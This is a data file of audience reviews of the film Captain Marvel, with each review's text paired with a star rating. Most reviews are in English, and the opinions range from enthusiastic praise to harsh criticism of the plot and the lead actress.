"I really do not see why this project flopped so badly given its circumstances. It had great potential, but instead brought the MCU one of the worst plot-handled stories. It really made no sense, and its overuse in CGI was boring. The first half of the film was an ""origin"" of Carol Danvers when in reality it was just a simulation. The character of Carol is obnoxious and forgettable, and I did not find this film to be enjoyable at all. In addition, its final fight scene was by far the worst in a superhero film...if you even want to call it a ""final fight"".",2
The movie is very good and interesting. I like it very much. I hope Marvel studios will continue to produce more great movies like this.,5
Awful. Unfriendly protagonist and poor screenplay.,0.5
The fact that they did away with the original backstory is what bothered me the most. Overall the movie was fun to watch. Larson could do a better job emoting her dialogues. Thus 3 ‚≠ê.,3
"Capit√£ Marvel repete a f√≥rmula de sucesso dos filmes do UCM, adicionando outro cap√≠tulo de origem com uma super hero√≠na carism√°tica (m√©ritos a Brie), uma espet√°culo visual incr√≠vel e uma trama interessante, que poderia ter sido melhor caso fosse tratada com pouco mais de seriedade.",3.5
"I thought it was an original, creative, funny, very good, engaging sci-fi movie and fit in well with the MCU. It was a thrilling and thoroughly entertaining introduction to the Captain Marvel character Marvel character. Brie Larson, Samuel L. Jackson, Lashana Lynch, Annette Benning and the rest of the cast were all excellent and convincing in their roles, It's a lot of fun.",4
its not that bad I very much liked it its a must watch,4.5
"A great launch to the character, with the right emphasis on avoiding the male gaze. A true action superhero movie that isn't catering to men.",4
One of the worst Marvel movie I have seen come out of phase 3. Brie Larson's acting was similar to that of a cardboard same goes for her character of Captain Marvel who comes off as narcissistic and cocky.,0.5
One of my favorite MCU movies. Love how the skrulls surprise on multiple levels. And the concept of a device meant to help Vers turning out to be a sort of muzzle is cool. I love Larson's wry reactions throughout. Lots of great characters.,4.5
"Watched this movie and it was bad. Plot, acting, directing, and all. Not really inspirational at all. Critics loved this movie but the fans hate it. There must be some kind of agenda with these critics.",0.5
"Nothing special, the kind of standard Marvel fare you expect. But low review due a truly unrelatable and quite unlikable main character. No real story arch, no challenge or struggle. Everything is easy and comes out in their favour. This type of writing seems to be the Hollywood standard now and underwhelming & unenjoyable experience.",1.5
In my oppinion one of the 3 worst Marvel movies. First time watching was interesting but watching it the second time was just pain. Just a bad written story. Only thing i liked was Goose. I definetly won't watch this movie ever again.,1
I liked it! A fun origin story. So that's why Fury wears an eye patch!,3.5
Not so much the actor's fault. It just feels so shoved last minute just so they can have the character in endgame.,2.5
incredible movie brings a very great empowerment through the warrior woman who saved the world lost her memory but still didn't give up what she believed was right,5
"Bad acting, bad writing, cringe and more cringe",0.5
"When you read Jim Satrlin's sagas, it's impossible to enjoy this movie.",0.5
"Es muy mala en muchos aspectos, de comienzo a fin trata de decir que todos los hombres son malos, digo trata porque ni en eso es buena la pel√≠cula, una pena que marvel haya vendido esta pel√≠cula como algo trascendental para poder ver Endgame, ya que como sabemos en Avenger's Endgame no hace nada.",0.5
"Terrible, just plain awful.",0.5
Horrible. Disrespectful with the original material and the great Jim Starlin's sagas.,0.5
"Standard Marvel movie, OK characters, OK plot. I'm hoping we get to see more Krull stuff.",3
Great action movie and addition to MCU. Larson and Jackson have great chemistry. Don't let negative reviews from trolls deter you from watching this one especially if you're a fan of the MCU.,4.5
"Brie Larson was terrible, that acting was horrific. Can't believe they are deciding to make another movie for this series",0.5
A ham fisted superhero origin film with an unlikeable main character that brims with all of the usual tropes and MacGuffins the audience has come to expect from the MCU template.,1
"This was just bad. I'm a huge fan of superhero films, so I'd go see this eitherway.... but I kind of wish I didn't. My partner fell asleep during it, which she never does.",1
It's probably the only mcu film I couldn't finished. It was just dull and lost my interest about an hour in. Not even sam could keep me watching.,1
"Pure brutal. Too powerful, no real suspense or story and not a likeable character. Don't know how anyone can like it.",0.5
"One of the worse marvel films to date. Thor 2 is worse, but at least has Loki. This one unnecessarily rewrites the MCU lore and ruins Fury's backstory instead,",1.5
Really liked this film. Loved the 90s nostalgia and loved Fury getting more air time.,4.5
This movie actually gives an excellent backstory with an unexpected twist that is connected in a right way to the avengers. It never bores and maintains the extraordinary aspect that kept the movie enjoyable,4.5
It was ok. I was expecting more.,2.5
"I really tried to like this movie, but the acting from the main character ruined it for me. I recently rewatched the movie, and the emotionless acting makes you feel bad for the co-stars.",1.5
"Is this the best MCU film? no is it the worst hell no The 90's theme is a bit heavy handed - yes we get it its the 90s! but over all this is a fun film with good characters I loved that the end of the film is a female power fantasy and not a redressed male one Men and women are different, we have different exp and different voices - Carol learned to not care what others expectations are of her and not accept the limits others tried to put on her and that rang true the same way I could believe Steve Rodgers power fantasy of becoming the best version of himself through physical improvement Go Carol - higher, further faster baby!",3.5
"The direction is solid and the performances from the likes of Brie Larson and Samuel L. Jackson is flawless and there are some inventive action sequences and moments, the overall narrative is weak and uninspiring.",2
It's an extravagant film never seen before story very unique story it's a tatti story with a very strong story arc the character is also tatti I liked the film very much,0.5
Pior personagem do UCM.,1
"This movie forced me to take a hiatus from watching marvel films. Poorly written characters, no character development, wooden acting, lame action scenes, slow poorly contrived plot... I could go on. Sadly I think this film serves as a setback for female superheroes who could be written and performed so much better than this.",0.5
"Not sure how people really don‚Äôt like it, but it has great action scenes, really good acting, and a memorable storyline. Top ten MCU movie imo.",4.5
I sat through the whole thing looking for something that would redeem the movie. Post credits I was still looking.,1
Mediocre acted in a movie that was just all-around boring.,1
One of the worst Marvel films. At least they implemented some nice effects.,1
"Boring , It's definitely doesn't worth watching, it seems they got wirse year by year",0.5
"Captain Marvel is technically proficient, but lacks quite a lot in the storytelling, writing and character department. It's passable, not the worst movie out there by any stretch, but it isn't good and certainly isn't great. To start, one of the biggest problems with the film is the character of Carol Danvers/Captain Marvel. It pains me to have to say this, but I'm not a sexist (cue- ""Sounds like something a sexist would say.""), I just enjoy well written characters. To be more specific, I'm drawn to flaws and perseverance in characters. A good comparison here might be the character of Superman- How do you make an infinitely strong and seemingly flawless character interesting? It's been done, for sure, but it's inherently a difficult task. Why? A character who can't gain strength or overcome something internal/external or otherwise see failure is, well, just boring. To put it another way, characters who begin their journey weak end their journey strong, ignorant then wise, unethical then ethical, and so on. Carol begins her journey with amnesia and then regains her memory (she is weak because she doesn't remember and then strong because she does). Unless the struggle of dealing with amnesia and getting through that is written well and with depth (e.g. we as the audience knew Carol from before, saw her fall and championed her struggle out of it) it ends up being nothing more than a caricature of good character development (less a rewarding character arch and more like just a plot thread). Another comparison to draw from is the character of Ellen Ripley (Alien franchise). Specifically her development through the films Alien and Aliens. In the beginning of Aliens we see the character of Ripley struggling with PTSD (from the events of the first film, Alien). She is mocked, belittled, stripped of her rank and status and generally we as the audience see her in a very low place. Through the events of the film we watch her grow, show resiliency and by the end she's not only proved herself, but she's overcome her worst fears and become a true hero. Ellen Ripley, a female protagonist from as far back as 1979 is, in my opinion, a better hero and role model than this iteration of Carol Danvers ever dreamed of being in 2019 (and naturally, a better written character). I don't think I'll ever really know why this kind of characterization is, at least portrayed, as being better than a character like Ripley. I love diversity in characters, but we need to start demanding better written diversity. PS- I only even bring up diversity and Captain Marvel's gender because it's clear (however well-intentioned) that diversity and gender played a big role in this film, its marketing and reception. Bring on more female characters, more diversity, but for ***** sake, give them well-written stories to inhabit, well-written characters to embody and a journey worth taking. More Ripleys-less Danvers. I'm still hopeful. There are several talented writers out there. Hopefully some of them are involved in Captain Marvel 2.",2.5
My favourite marvel movie! Love Carol Danvers - she's such a badass. Enjoy how we get to see the story before the avengers happened.,5
Mas uma for√ßa√ß√£o de barra - lament√°vel o que est√£o tentando nos empurrar goela abaixo,0.5
the most boring MCU ever!,0.5
No character development in this dull superhero flick.,2
"Not that bad a movie, but not worth a second watching. One of the weakest in the MU. And no Brie, I don't want you back as Captain Marvel. You are a great actress and can do better than playing a mediocre heroine.",2.5
"A bit meh :( I wanted to like it, but past the basic pretty colours, it was quite bare",2
Best of Movies/TV Series Collection,5
"A totally awesome MCU entry, clever, hilarious, surprising, with some great origin stories of important characters and it makes you look at yourself and question your assumptions and default biases. I don‚Äôt understand the low scores, sounds like something besides the movie/plot is driving them. See this movie, it‚Äôs incredible.",5
Wooow this is a baaad movie. Worst lead character in the entire Marvel Universe!,0.5
"Unmemorable movie, there's a little of Top Gun, Green Lantern (that said it all) and worst of all a little of Marvel magic. The protagonist is mono-dimensional and we know how cool, good, fun she is by what other character say about her. She never acts cool, fun or anything else... a big shame!",2.5
"Aside from the most woodenactor in the world, the cgi is laughable at times",1
espanol - me desagrada la pilicula por que no tiene la narrativa del camino del h√©roe y despu√©s vi en la redes sociales la actriz y me desagrada personal mente (quieren meter ideolog√≠a de genero y adoctrinar en todas las pel√≠culas ),0.5
Brie Larson put too much of her own obtuse personality into the film,0.5
Trama completamente forzada. Llega un personajes completamente desconocido a imponerse a las malas. Aparte la actriz es super mega antipatica. tanto en la pelicula como fuera de ella.,0.5
"Yes, I know the anti Cpt Marvel diatribe, but as an original Marvel Comics fan, i found it enjoyable. A bit too much of today's commentary on society but, all in all, an enjoyable film.",4.5
"A movie just as good as the other origin stories for characters in the MCU, Brie delivers a good and solid Carol Denvers, with her military mannerisms and her background as a strong woman. I would particularly do it differently about the way she gain her powers, but it's ok, this is a universe where Bruce Banner shoots himself with gama radiation; the hole Kree nuclea very good, love Jude Law, love Gemma Chan. I don't like the way they led Nick Fury's core, I was expecting more of the serious Samuel L. Jackson from the first phase, but it's nothing that destroyed the movie.",5
Wow I tried watching it expecting it to be rough but I didn't expect it to be THAT bad LOL,0.5
"The plot is weak. Not a huge fan of this movie. I really wanted to like it but Marvel flopped their first attempt. And that's okay! Please Marvel, give us a GOOD movie next time.",2
"Not the worst MCU movie but it wasn't anywhere close to being a fun, enjoyable Marvel movie. The plot moved slowly and it was predictable. Brie Larson's acting and the writing of her character ended up making a boring dislikable character with little to no character development. On the other hand, Samuel L Jackson as Nick Fury once again on screen carried the show as a side character; he made the movie somewhat better than it was. I hated one of the scenes with Nick Fury and a cat... not going to spoil the movie but come on they could have done a lot better. One of the reasons this movie didn't work is because it was trying to be too many things at once, and it couldn't stick the landing.",1.5
"An utter bore, bereft of creativity or sincerity. The first true signal for Marvel's new direction: warring with fans by sacrificing genuine creativity and entertainment for political messaging and fan-blaming. Brie Larson is another nepotistic Hollywood child, only one with stiff, wooden acting and a massive sense of entitlement. It bleeds through her portrayal. The character is vapid and lifeless. The story is paper thin. The ""villain"" might be the worst in the MCU's notoriously lackluster line up. The movie is garbage, a waste of hundreds of millions of dollars to produce something worse than forgettable. People starve while movies like this are made? Wow, what a hero.",0.5
"This movie was horrible. Carol was wooden, uninteresting, and went through no personal growth. The one thing she did do was go from powerful to more powerful without gaining any appreciation for the power she was given. This movie constantly shoved 'you can't do it because you're a girl' in the audience's face so Carol could repeatedly 'slaaaay qweeeen' without really facing any opposition. A character needs to get knocked down before they can get up, better as a person as well as power. Thor lost his hammer, Iron Man was taken captive, Carol...what? Steals a guy's jacket because he said smile more? PS I am a woman. Sorry, no male fragility here.",1
"I heard that this movie wasn't well-liked, but it is actually a very fun movie with a likable protagonist and everything. My whole family had a great time. I then found out that apparently, the movie was review-bombed by misogynists and the real polls showed that 80% of viewers enjoyed and recommended it, and it was reflected in a successful box office run. I wish I knew that sooner and didn't avoid it for so long.",5
"For all then noise, this is an average and somewhat stereotypical hero origin story, without much depth. Maybe one difference would be that the lead character is actually not expected to improve herself, but rather realize that she was perfect all along, which is a much less compelling narrative. If you need to waste time and don't have anything else to watch, this is something that can be seen to pass the time, but certainly would not recommend you choose to do so, especially if you have any other options.",2
"Super bland the only fun scenes are when Carol & Nick Fury are having back & fourth discussions & the final battle Carol has in space against the Kree. Carol is probably the biggest Marry Sue to this day since besides the flashbacks where she has to act like a tough girl their is nothing else for us to latch onto her usually whenever a powerful superhero gets introduced we see they have a sensitive side to them like Thor, Superman, Wanda, etc their powers shouldn't be their identity. I do however like how we get the Skrulls introduced into the MCU due to how many interesting stories we can get from them in the future like Secret Invasion which can be interesting to see in live action.",2.5
"No good movie at all. There was absolutely no character development. It was interesting, to see something of the scrull and Kree but yeah, thats all good, i can say about it.",1
Interesting and with good characters. Its fun to watch,3.5
was ok just not marvel,2.5
"Mediocre at best. Zero character development or growth throughout the movie. Danvers starts her journey unbelievably overpowered and just has to realize how awesome she is. There is a single moment where she is captured and I thought it was going to be a growth moment for her. Cue ""I'm just a girl"" background music as she beats the snot out of every skrull with both hands restrained. There's no stakes, or tension. It becomes obvious very quickly that there is no way that Captain Marvel is in any danger. And I know she's the protagonist and the good guys always win but the writers need to learn how to create tension. CM just strolls from one fight to the next and doesn't even break a sweat. And the way they turn Nick Fury's eye into a joke at the end of the movie was nothing more than a mean spirited jab at a seriously traditional masculine character.",0.5
"I enjoyed this movie. I thought it was funny, and the chemistry was strong. I've re-watched it several times, and I don't get the criticisms. The acting is fine. The chemistry between Larson and Jackson is great. The origin story, though typically scant on rational thought (but need I mention being bitten by a radioactive spider?) still unfolds nicely throughout the movie. And she shows much more than one facial expression. I'm pretty critical, and I don't get the criticism at all. Time well spent.",4.5
"Horrible film. I don't know which was worse: the horrible script, which thought it was clever and funny, or the horrible acting by the lead actress who had one facial expression throughout. I saw it once at the cinema, wanted to walk out about halfway through due to boredom and never intend to ever watch this piece of trash ever again.",1
‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ I watched it for its Visual Effects.,5
The movie focuses more on the messaging rather than character development and fails at both.,2
Probably the lamest MCU movie so far. That's what you get when the main character is so unlikable.,1
Szem√©t. Egy utols√≥ √≥cska szem√©t. A f√©l csillagot a cica miatt kapta n√©lk√ºle semmit sem √©rne.,0.5
Brilliant casting. One of the best MCU films.,5
Just not that great. passed time but thats about it. watch any other marvel stuff besides early hulk lol,2
Loved it! Great storyline. Loved the characters.,5
Good start to the Marvel franchise.,3.5
"Not a good story, did not have a real part in the Mcu storyline. Was just to make money instead of actually putting a good story and background to it. Could have been done a lot better.",1
"The main actress went out of her way to make sure this film never stood a chance with a significant portion of the fanbase, but ignoring that, the film itself is pretty dull. Larson's character isn't quite as obnoxious as the actress portraying her, but the filmmakers give us nothing in terms of character development. As others have noted, her arc was that she was awesome all along, and she just had to realize how awesome she always was. Vacuous and sad.",1.5
"Brilliant film, start to finish",5
This movie is actually really good. Sad to see people bomb it with negative reviews just because they don't like Brie Larson (who is an amazing actress) or simply because they don't like to see a woman with power on screen,4.5
I thought it was a fun movie the Talos is cool and so is obviously Sam L Jackson the rest of the movie is like eh but still a great and fun time,4.5
Probably one of the worst movies Marvel has made. Brie Larson's acting was horrible and the story went nowhere. Her origin story was the worst.,2
Good fun movie nothing too deep but entertaining,4
What makes me mad is I wrote a whole review last time about how I genuinely didn't like the movie and gave it 2 stars. That fact they took it down after I spent the time to write it makes me feel spiteful. I'm dropping it half a star for that.,1.5
"To be honest, I don't like Brie Larson's Captain Marvel. I hope it's a problem isolated to this movie, maybe it gets better when her stories have participation from other characters in the universe.",1.5
It was enjoyable. It was cool seeing Ronan and Korath again. Didn't like how they made Mar-Vell a woman. 2.5 = Ok,2.5
"Great Marvel origin story, really liked the chemistry between Larson and Jackson. The twist was unexpected and added another layer of depth. The movie ties into the wider MCU by setting up the Avengers initiative but keeps its own identity, I enjoyed it a lot. Especially Goose!",5
"Wastenof time and money. Besides the weak story and mediocre acting by all involved, you can't get around Brie Larsen's wooden performance. She spends the movie doing her best not to have any facial expression. It seems her entire goal of the film is to try to reenact Tom Cruise's role in Top Gun, without the charm or likability. Which is unfortunate becUse, having seen Brie Larson in the TV show Community, I was really looking forward to her taking on this role. She plays the part with extreme hostility for the character and contempt for the audience. She seems to double down on her instead unikeability in her subsequent roles as Capitain Marvel. In the subsequent Avenger movies. Granted, the entire concept of how Capitan Marvel beicame a superhero because in the movie was ridiculous, and how Nick fury got his eye patch was disrespectful to his character, Brie Larson didn't have a ton to work with, her lack of talent made and mediocre movie dreadful. Even if you were to ignore her unpleasant demeanor and self-righteous interviews, the concept of Captain Marvel brings very little to the avengers story. And Miss Larson's betrayal of Captain Marvel nearly ruins the entire franchise. To summarize, Ms Larson's acting was a d- at best. The remaining cast was a C- to a B+ in parts. The overall storyline was C, and the special effects were a B. I rank this movie below the second Thor movie. By far the worst in the Marvel universe.",0.5
absolutely horrible movie,0.5
"A pretty good origin movie for Captain Marvel. Really looking forward to a sequel. I don't know why so many people had a problem with Brie Larson's acting. I thought it was great. I guess people didn't like how stern and stoic her character was, although if this were a man I don't think anyone would be complaining about it. I mean she was less serious than say Batman, at least she wasn't completely above smiling.",5
"Some of the MCU movies have been mediocre, Iron Man 2, Iron Man 3, Thor 2, Thor 4, Black Widow. This is the first movie that actually reduced by appreciation of the Marvel movies. It just feels they went in an opposite direction from the majority of Marvel movies with this one. They are there to entertain and mix in little tidbits from the comics that are easily recognizable. This one just dumbed down the very concept of Captain Marvel and Ms. Marvel into a take on a controversial feminist run of the comics. It just felt they didn't want us to enjoy the movie, just annoy the audience and burn away some good will.",1
"WTH was MCU/Disney thinking or smoking when they approved this idea? The Captain Marvel comic is not a good comic, it does not sell well, so I am not sure what made them think THIS was a good idea. Brie Larson had the same dumb look the whole movie, which was the same in 21 Jump Street. At least in 21 Jump Street she was suppose portray a dumb teenager, but what was the excuse in this film? The editing was on par with the rest of high dollar MCU movies. The writing and direction of the movie was just bad with bad jokes, bad dialog and a very bad plot.",0.5
"If it wasn't wedged between Infinity War and End Game, I would never have seen it. Brie can't act, and she comes across more as a Villain than hero.",0.5
"Way to powerful, dripping feminism, and not true to the comics.",0.5
very preachy and full of itself. Felt like I was being lectured by the class know-it-all,0.5
Awful movie. Do not waste your time.,0.5
"The beginning of the end for the MCU right here. An insufferable protagonist leading in a film that really doesn't matter at all to the overall MCU story. She could have popped up in End Game with an extra two lines of dialog and that would have been a better intro than this mess of a movie. Disney Marvel really has no idea how to handle their female heroes when they become the main protagonists as they basically behave in a manner that gets called ""toxic masculinity"" when men do similar things.",0.5
Simply awful I've never been so disappointed with a characters development before.,0.5
"Aunque no soy muy fan de las pel√≠culas de superh√©roes, esta claro que desentona con el resto de pel√≠culas, tiene contradicciones constantes con las otras obras y m√°s que entretener busca un discurso pol√≠tico que esta de moda los √∫ltimos a√±os. A ver cuando vuelven a hacer pel√≠culas para entretener y no ""educar"".",0.5
"Yeeeeeeeeeeeah, well, actually... No.",0.5
"Main actor failed her performance, movie was generic and predictable.",1.5
"A brainless female empowerment hero movie. It only looks good, but its neither smart or funny. There is no emotion behind tha character.",1.5
"The first MCU film with a female lead. The plot is interesting and the conflict between Kree and Skrull can recall the events of colonization that took place in history. There is a lot of girlpower in the film which at times makes the protagonist's character a bit unsympathetic. Very nice is instead Nick Fury who comes up with funny gags. Although audiences hated this film, I find it enjoyable and entertaining.",3.5
I would have like to have seen the original male protagonist before being introduced to the female version as per original comic books. I believe the storyline could have been a little bit different as well.,2
La peor pel√≠cula del MCU. Panfletazo feminista...,0.5
"Boring and the main actress was so bland. No challenges to overcome, boring.",0.5
"Simply a mess. Bad writing, forced social messaging pushing the current female power agenda. A character that is not well liked in comic books was a bad idea, and making her an overpowered Mary Sue!! The marvel movie universe really stopped after ""endgame"" now it's just about social justice forced into movies and shows.",1.5
Stoic acting and predictible plot filled with common feminist tropes and unrealistic character responses.,2
"Its not that the movie is terrible, its just not good. Many movies get away with this by being funny in how bad the movie is but this is not that. The movie is about one step away from being terrible though. The plot premise is good enough but falls flat. Never flat. Then you have Disney making a character, designed to be very over powered as a social commentary and just roll with it like it just makes sense. She is really the only super hero they didnt lower the power of and it really shows how desperate they tried to make the character awesome. Then the acting also fell very flat. Yes yes, we all know the main actress is bad. Her social media posts and all that prove she is not a good person and Disney, in their time of pushing current social commentary HARD, mixing her into the mix was a recipe for disaster just waiting to happen and the reviews here show that. Like I said... its not a good movie but it isnt terrible. I would say easily the worst though of all the Marvel movies and shows. How this got a second movie, I will never know. It wasnt any better either. We just skip these movies in our Marvel binges and try to ignore the very cheesy scenes in the last Avengers movies.",2
I loved the movie and the 90s feel. It was a great romp.,5
A great watch that I keep coming back to every now and then. It has some crucial introductions/characters that link the MCU to the past and the future and that's what I love about the movie!,5
Overhyped and generic. Was lucky to be released in between two Avengers movies,0.5
"The lack of a charismatic main character and a messy plot and storytelling make this one of the worst movies in the MCU, with one the most forgettable villains in the franchise. 4/10",2
This was bad. I am not a big fan of super hero movies but wow this one was a stinker.,0.5
"A hero you want to dislike, she's just mean and above everyone else.",0.5
"Captain Marvel is a quality movie despite popular opinion saying otherwise. ""Worst stand-alone MCU film of all time."" Does nobody remember Iron Man 2 or Thor: The Dark World. Brie Larson does a relatively decent job playing the role of Carol Danvers (Captain Marvel) and the movie doesn't come across as boring for the majority of the film. The start to middle parts of the movie do feel slow but the pace does begin to pick up. Solid Movie ----------- 7/10 (3.5/5)",3.5
very mid movie. worst mcu solo movie by far,2.5
The titular character came off as bland and boring,2
Well the movie plot was ok but it's boring it's not that good and not that bad just boring 6/10,3
"The plot of this movie was quite incoherent, the movie had no direction and was defiantly a disappointment since Captain Marvel is one of my favorite super heros",1
I didn't even know who Brie Larson was before this movie and now after turning this awful movie off after 20 torturous minutes. I don't want to know who she is EVER again. Byeeee.,0.5
"Enjoyable, could have been better but decent.",3.5
The story plays out as it should and a few surprises. An excellent 2nd movie in the MCU timeline.,5
Filme muito pretencioso tanto do movimento pol√≠tico dentro a protagonista antip√°tica e nos personagens masculino uns inbecis insuport√°vel Filme feminista horroroso,0.5
A good very good movie but could be better,4
"Great, if not excellent. As good as or better than every other solo, origin movie in the MCU with the possible exceptions of ‚ÄòDr. Strange' and, if you count it, ‚ÄòGuardians'. Troll responses from sensitive whiners are just that: people loved this movie, while offended, internet warriors hated it so much that they tried to change that perception. It didn't work. A billion dollars is a billion dollars.",4
I loved Brie Larson's performance! This is one of my favorite Marvel movies!! Also Goose is the GOAT.,5
"One of the best Marvel movies ever made. Larson carried the movie. Solid cast, acting and writing.",4.5
Such a boring character,0.5
"Screenplay was wrong since the very beginning, Where a golden character legacy of MAR-VELL could be a women but at least powerful not a weak old lady. Last enemy could be defeated by hawkeye",0.5
"Captain Marvel when I first watched it didn't sit with me too well but after watching it again I can definitely say that my opinion on the movie has changed and it has grown on me a bit. I like Brie Larson in the role a bit more than I use to but I still don't think it's a great it. I really liked the dynamic between Fury and Danvers, the plot twist did catch me by surprise, and the action was pretty solid but a lot of the characters felt kinda stale and 2 Dimensional and didn't help the plot very much but this film in my opinion doesn't deserve as much hate as it gets or has gotten.",3
The must forgettable movie in the whole franchise with my most hated character in it. Easy to say that this was not the greatest film but more specifically not the best characters besides Samuel L Jackson. Captain Marvel is such an egotistical unlikeable character that is even worse in avengers endgame. Bad movie,1
"This movie is very special to me, not only because of the participation of Brie and Samuel, but the stories of Captain Marvel are amazing and the movie itself is very captivating!",5
"It doesn't really bring much to the table, the main plot is quite generic. Good CGI.",3
"Although being review-bombed by misogynist bigots, Captain Marvel still isn't all THAT good. Brie Larson may have needed more time to figure things out, and some cringey writing definitely needed to be revised. It maintains its four stars due to a compelling plot and a fantastic performance from Samuel L. Jackson as Nick Fury--but we already knew that.",4
Captain Marvel just needs more in-depth character. Watching her in the story is just uninspiring. Because the story is boring and unengaging. The only good thing about this movie is young nick's furry and the plot twist of the Skrull.,2.5
"Injusti√ßado! Del√≠cia de filme! Leve, despretensioso e emocionante.",5
This movie is the long kiss goodnight with geena Davis but in space a brilliant mcu origin movie I can't wait for 'captain marvel 2 the marvels',5
"Best thing about this movie was the special effects. I wanted to give it lower marks because I personally just don't like the main lead, but I have to be fail and balanced. And this movie was actually not as bad as most people make it out to be. I get that we all don't like the main actress but we can't destroy the film over it. It was a mediocre film and the effects were good. It wasn't a bad movie, it just wasn't good. Plot wasn't great, acting was mediocre.",3
Captain Marvel was just awful. The leads acting was as dry as a over cooked piece of toast and as entertaining as watching paint dry. The writing was not great. This character seems so forced down our throats and so OP to further force it that it was hard to be interested. Maybe focusing on better writing will make this character and future movies more like able. This was awful.,0.5
Another great Marvel movie.,5
"It was boring, predictable and Brie Larson can't act!",0.5
"Decent, but very normal forumula",3
"This ho-hum superhero flick is fast-paced, but follows the formula a bit too much. Fast cut action scenes set to girl-rock anthems was fun enough for me.",3
"An absolute snoozer of an action / buddycop movie. Samuel L Jackson does well here, but Bri Larson is given absolutely nothing to work with in this script and direction. Also the ""twist villain"" is absolutely pathetic.",1.5
Very cringe and disappointing,0.5
Very enjoyable. Captain marvel kicks butt!,4
Smug self righteous overpowered girl hits things a lot. Nick Fury loses his eye to a Cat. that about covers it.,0.5
People's hate for this movie is forced. I love it and can't wait for The Marvels.,5
"Ambitious, well paced and surprising (if you don't know the comics) - does not disappoint",4
"Isn't the best, but not the worst. Can't really remember much from the movie also which makes it doesn't feel as important. The character itself is aight ig.",2
"Boring, Bland with a forgettable villain and an even more forgettable plot with a main character that hates everything and has done absolutely nothing to deserve her powers. Mary Sue alert big time.",1
Not a good movie. The acting and cgi are horrific.,1
snoozefest. Can't believe they butchered the Kree vs Skrull story potential.,1
"LOVE this movie. Her struggle as a little girl is very touching. It set the tone for her resilient 'never give up' character. My daughter found it inspiring and impowering. I enjoyed it immensely too, lots of layers. It's one of those films that benefits from multiple viewings. Reading some reviews it seems a lot people didn't understand parts and haven't given it a second chance. I've watched it six times so far, twice at the cinema, once on HBO, three times on my Blu-ray. Enjoyed it every time. The younger versions of Fury and Coulson were tremendous, the cat was hilarious. I'm currently loving 'Ms Marvel' and I liked Monica Rambeau in 'WandaVision' too, so I'm REALLY looking forward to seeing them both team up with Captain Marvel in 'The Marvels'.",4
The one star is for Ben. His story and character is way more interesting than Brie Larson and cap marvel.,1
"Eh, it was kind of lame. Marvel was sort of a boring character",0.5
"Captain Marvel is a classic MCU origin story, using a familiar if overused formula that still manages to work here. Carol Danvers/Vers/Captain Marvel isn't the most compelling hero, but Brie Larson delivers a solid performance in the title role. Seeing a young Nick Fury (Samuel L. Jackson) is fun and adds to his character, and Coulson's brief return to the big screen is entertaining if not undercut by a minor twist. The reveal of the true villains is fun, and Ben Mendelsohn's Talos is funny and entertaining. The return of Ronin to the screen had potential, but was cut short and his role was minimal. Jude Law's Yon-Rogg is un-compelling, although seeing him get blasted by Captain Marvel is strangely satisfying. Though it has numerous issues, Captain Marvel still does a good enough job introducing a new hero and making it funny enough to add enjoyment to the viewing.",4
"Yeah, this is better than CATS.",3.5
It was really good it was the first marvel movie I watch and it inspired me to keep watching them,3.5
Boring. The worst mcu movie ever!!!,1.5
Captain Marvel didn't have a heroic character but came across as stuck up and holier-than-thou.,0.5
"This was not a very good movie. Like the original Thor I did not care for anything that happened on the alien worlds. It was just kind of boring, the movie was 30 minutes too long and it got a bit political for my liking. Brie Larson was not a good choice either, she lacks the charisma for that role. Emily Blunt would have been a much better choice, but if the producers thought she was too old they could have gone with Natalie Dormer, who looks exactly like the comic book drawing. If there was any saving grace for the movie it was the fish out of water story taking place in the 1990's. Sadly this part of the story is short and all too fleeting. It could have used more of this. This is one of only 2 Marvel movies I do not own. Only watch this if you are a completionist, otherwise it can be skipped.",0.5
"the movie could have been better, it was to introduce important characters to the MCU, it did some of those introductions well, but it lacked something else.",2
Whack movie. Super boring. Hopefully Iman Vellani can carry the sequel.,0.5
worst marvel movie ever. horrible writing and bad character development don‚Äôt even bother.,0.5
"This is by far the worst marvel film I've seen.... so far! The character Mar-vel (and main actress) are pure and simple just awful. This was the first Marvel film who had made me realise ""you know what, not everything Marvel produces is good""",0.5
Please come up with original ideas.,2.5
"This is the worst MCU movie to me. The story is so confusing and boring, and there is no good humor involved. Brie Larson's very bland character filled with girl power makes me want to cringe. She clearly isn't fit for the main role of the movie, as she shows no real emotions and depth to her character. And also, she is way too overpowered for my liking, especially toward the end of the movie. The villain is one of the most forgettable in the whole of MCU, that I can't even remember his name minutes after I watched it. Samuel L. Jackson partially saves the movie from being absolute trash for me, but the rest of the movie sucks. If there's a girl-led superhero movie that I want to watch, I'd rather watch Wonder Woman, a freaking DC film. It shows Captain Marvel how good of a movie it was supposed to be.",1
I love this film nothing bothers me. I have no complaints about any of the MCU this film was put together soo good!! plot and story.. awsome!! top 7 films of all time. others being NWH and dr strange and the multiverse of maddness ect!,5
No character arc and no tension. Just another dull CGI mess from the Marvel factory.,0.5
I honestly believe this is one of the best mcu movies out there it's probably around 15th and has a good plot and great cgi and pacing and it's didn't feel rushed when i watched it and it was easy to understand and the way they introduced carol was great and it's definitely one of my favourite back stories. i genuinely believe that it's rated this low because the the first mcu female lead movie based on a female character and also peoples general hate for brie larson which is disappointing because the movie is really good and i don't think people should have judged a movie/character because of their hate towards the actress.,4.5
"Possibly the first ""bad"" movie the Mcu has ever put out.",2.5
By far the worst MCU movie I had to suffer to watch. It was so cringe and and tried too hard with female empowerment. Jessica Jones did it alot better..,0.5
That was a terrible movie at first oh it was good but when i watched the second time oh there definitely makeing it bad.,0.5
"I honestly didn't think I could dislike Brie Larson any more than I already did, until I watched this movie. How is it possible for her to be so stuck up and full of herself at all times, while being at best a D-list actress? Performance was beyond flat, too bad the studio couldn't hire a double for her acting like they did for her Hank Hill situation.",0.5
"With all of the negative reviews and hate for the lead actress out there, I was expecting the worst... But Samuel L. Jackson and Brie Larson work well together and I really enjoyed their performances!!",5
Heavily underrated film i enjoyed it and it got me so interested a lot of people are just mad because she is op,5
"I liked this movie, I can watch it multiple times. I like the character Ms. Marvel, Bree is hott. I hope to never see Bree in short hair ever again though, that was hideous.",3.5
"Terrible movie. No fun, no good story. No character building.",0.5
A buddy cop type story where the two characters have little to no chemistry with each other and aren't exactly likeable. Story wasn't interesting and telegraphed it's ideas too hard for any reveal or interesting things to happen.,1
"Really fun! Marvel's take on a 90's action movie, which wasn't a genre I expected them to tackle!",5
